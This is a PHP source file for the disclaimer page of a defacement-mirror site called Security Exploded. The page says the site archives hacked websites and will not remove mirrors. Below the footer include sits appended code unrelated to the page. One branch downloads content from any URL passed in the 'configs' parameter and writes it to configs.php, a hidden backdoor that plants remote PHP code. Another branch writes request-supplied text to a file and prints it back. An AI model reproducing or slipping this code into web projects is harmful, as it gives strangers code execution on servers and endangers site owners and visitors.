<?php
include'header.php';
?>  
<div id="main-wrapper">
<h2>Disclaimer :</h2>
<div class="tempat"> <br>
<b>DISCLAIMER </b>: All The Information Contained In Security Exploded's Cybercrime Archive Were Either Collected Online From Public Sources Or Directly Notified Anonymously To Us. Security Exploded Is Neither Responsible For The Reported Computer Crimes Not It Is Directly Or Indirectly Involved With Them. You Might Find Some Offensive Contents In The Mirrored Defacements. Security Exploded Didn't Produce Them So We Cannot Be Responsible For Such Contents.
<br>
<br> 
If You Are The Administrator Of An Hacked Site Which Is Mirrored In Security Exploded, Please Note That Security Exploded Is Not Related At All With The Defacements Itself.
<br>
<br>
<b>Don't Ask Us To Remove The Mirror</b> Of Your Defaced Website, As A Cybercrime Archive Security Exploded Mission Is To Keep The Entries In The Database.
<br>
<br>
All The Self-Produced Material Belongs To Security Exploded. You Are Free To Use It As Long As Proper Credits To Security Exploded Are Reported As By The CC License Reported Below.
<br>
<br>
Security Exploded Not Responsible For The Use/Misuse Of The Published Information, You Can Use It At Your Own Risk.
    <br>  <br>  <br> <br><br> <br>
</div>
</div>

<?php include "footer.php"; ?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>